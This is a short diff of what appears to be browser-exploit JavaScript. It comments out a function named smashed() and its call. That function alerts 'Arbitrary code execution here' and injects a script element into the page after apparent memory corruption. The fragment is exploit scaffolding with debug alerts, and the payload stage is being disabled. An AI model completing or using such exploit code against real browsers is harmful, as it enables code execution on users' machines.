@@ -215,7 +215,7 @@ function go_() {
  				bufs.push(stale)
 				
  				if (smsh.length != 0x10) {
- 					smashed(stale[0]);
+ 					//smashed(stale[0]);
  				}
 				alert("3");
 				//alert("4");
@@ -238,6 +238,7 @@ function go_() {
 	}, 500);
 }
 
+/*
 function smashed(stl) {
 	alert("Arbitrary code execution here.")
 	var x = document.createElement('script');		
@@ -245,6 +246,7 @@ function smashed(stl) {
 	document.getElementsByTagName("head")[0].appendChild(x);
 	return 0;
 }
+*/
 
 function go() {
 	dgc();
